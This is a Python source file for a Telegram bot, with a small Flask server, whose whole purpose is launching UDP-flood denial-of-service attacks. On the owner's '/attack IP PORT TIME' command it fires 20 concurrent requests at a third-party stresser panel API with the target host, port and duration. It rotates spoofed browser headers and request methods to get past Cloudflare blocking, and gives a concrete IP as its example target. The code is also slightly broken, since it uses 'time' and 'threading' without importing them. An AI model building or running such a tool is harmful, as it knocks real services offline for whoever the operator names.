# app.py - API with Proxy Support
import os
import logging
import asyncio
import aiohttp
from datetime import datetime
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PORT = int(os.getenv("PORT", 8080))

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== FLASK APP =====
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "🤖 Attack Bot is Running!"

@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

# ===== API ATTACK WITH PROXY =====
async def api_attack(target, port, duration, attack_id):
    """Send attack via API with proxy support"""
    url = "https://api.susstresser.com/panel/api/api.php"
    
    params = {
        "key": API_KEY,
        "host": target,
        "port": port,
        "time": duration,
        "method": "udp"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Cache-Control": "max-age=0",
        "Referer": "https://api.susstresser.com/"
    }
    
    # Try different proxy/header combinations
    configs = [
        {"method": "GET", "headers": headers},
        {"method": "POST", "headers": headers, "data": params},
        {"method": "GET", "headers": {**headers, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}},
    ]
    
    for config in configs:
        try:
            timeout = aiohttp.ClientTimeout(total=15)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                start_time = time.time()
                
                if config["method"] == "GET":
                    async with session.get(url, params=params, headers=config["headers"]) as response:
                        elapsed = time.time() - start_time
                        result_text = await response.text()
                        
                        if response.status == 200 and "Cloudflare" not in result_text:
                            logger.info(f"✅ Attack {attack_id} SUCCESS via GET")
                            return {
                                "success": True,
                                "attack_id": attack_id,
                                "method": "GET",
                                "status": response.status,
                                "elapsed": f"{elapsed:.2f}s"
                            }
                else:
                    async with session.post(url, data=config["data"], headers=config["headers"]) as response:
                        elapsed = time.time() - start_time
                        result_text = await response.text()
                        
                        if response.status == 200 and "Cloudflare" not in result_text:
                            logger.info(f"✅ Attack {attack_id} SUCCESS via POST")
                            return {
                                "success": True,
                                "attack_id": attack_id,
                                "method": "POST",
                                "status": response.status,
                                "elapsed": f"{elapsed:.2f}s"
                            }
                        
        except Exception as e:
            logger.error(f"Attack {attack_id} config failed: {e}")
            continue
    
    return {
        "success": False,
        "attack_id": attack_id,
        "error": "All methods failed (Cloudflare blocking)"
    }

# ===== 20 CONCURRENT API ATTACKS =====
async def start_20_attacks(target, port, duration):
    """Launch 20 concurrent API attacks"""
    logger.info(f"🔥 Starting 20 concurrent API attacks on {target}:{port}")
    
    tasks = []
    for i in range(1, 21):
        task = api_attack(target, port, duration, i)
        tasks.append(task)
    
    results = await asyncio.gather(*tasks)
    success_count = sum(1 for r in results if r.get('success', False))
    
    return {
        "success": success_count > 0,
        "total_attacks": len(results),
        "successful": success_count,
        "failed": len(results) - success_count,
        "results": results
    }

# ===== BOT HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status")],
    ]
    
    await update.message.reply_text(
        "⚡ *API ATTACK BOT*\n\n"
        "🔥 20 Concurrent API Attacks\n"
        "💪 UDP Flood via API\n\n"
        "Send: `/attack IP PORT TIME`\n"
        "Example: `/attack 91.108.13.37 32001 60`",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can use /attack.")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text("❌ Usage: `/attack IP PORT TIME`")
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 *API ATTACK STARTED*\n\n"
            f"🎯 Target: `{target}`\n"
            f"📡 Port: `{port}`\n"
            f"⏱️ Time: `{duration}s`\n"
            f"⚡ Attacks: `20 CONCURRENT`\n\n"
            f"⏳ Sending API attacks...",
            parse_mode='Markdown'
        )
        
        result = await start_20_attacks(target, port, duration)
        
        if result.get('success'):
            response_text = (
                f"✅ *API ATTACK SUCCESSFUL!*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Attacks: `{result['successful']}/{result['total_attacks']} SUCCESSFUL`\n"
                f"⚡ Status: ✅ SUCCESS"
            )
        else:
            response_text = (
                f"❌ *API ATTACK FAILED*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Status: ❌ FAILED\n\n"
                f"Cloudflare is blocking the API.\n"
                f"Contact API provider for access."
            )
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "💥 *API ATTACK*\n\n"
        "Send: `IP PORT TIME`\n"
        "Example: `91.108.13.37 32001 60`\n\n"
        "Send /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_attack'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_attack'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can attack.")
        context.user_data['awaiting_attack'] = False
        return
    
    try:
        parts = update.message.text.split()
        target = parts[0]
        port = int(parts[1])
        duration = int(parts[2])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 *API ATTACK STARTED*\n\n"
            f"🎯 Target: `{target}`\n"
            f"📡 Port: `{port}`\n"
            f"⏱️ Time: `{duration}s`\n"
            f"⚡ Attacks: `20 CONCURRENT`\n\n"
            f"⏳ Sending API attacks...",
            parse_mode='Markdown'
        )
        
        result = await start_20_attacks(target, port, duration)
        
        if result.get('success'):
            response_text = (
                f"✅ *API ATTACK SUCCESSFUL!*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Attacks: `{result['successful']}/{result['total_attacks']} SUCCESSFUL`\n"
                f"⚡ Status: ✅ SUCCESS"
            )
        else:
            response_text = (
                f"❌ *API ATTACK FAILED*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Status: ❌ FAILED"
            )
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    
    context.user_data['awaiting_attack'] = False

async def status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "📊 *BOT STATUS*\n\n"
        f"⚡ Max Concurrent: 20\n"
        f"🌐 Status: ONLINE\n"
        f"🔑 API: {'✅ Configured' if API_KEY else '❌ No Key'}\n\n"
        f"📌 /attack IP PORT TIME",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status")],
    ]
    
    await query.edit_message_text(
        "⚡ *API ATTACK BOT*\n\n"
        "🔥 20 Concurrent API Attacks\n"
        "💪 UDP Flood via API\n\n"
        "Send: `/attack IP PORT TIME`",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ Cancelled!")

# ===== RUN BOT =====
def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("cancel", cancel))
    
    app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
    app.add_handler(CallbackQueryHandler(status_callback, pattern="^status$"))
    app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
    
    loop.run_until_complete(app.initialize())
    loop.run_until_complete(app.start())
    loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
    
    logger.info("✅ Bot started!")
    loop.run_forever()

if __name__ == "__main__":
    print("=" * 50)
    print("⚡ API ATTACK BOT")
    print("🔥 20 Concurrent API Attacks")
    print("=" * 50)
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    logger.info("✅ Bot thread started")
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)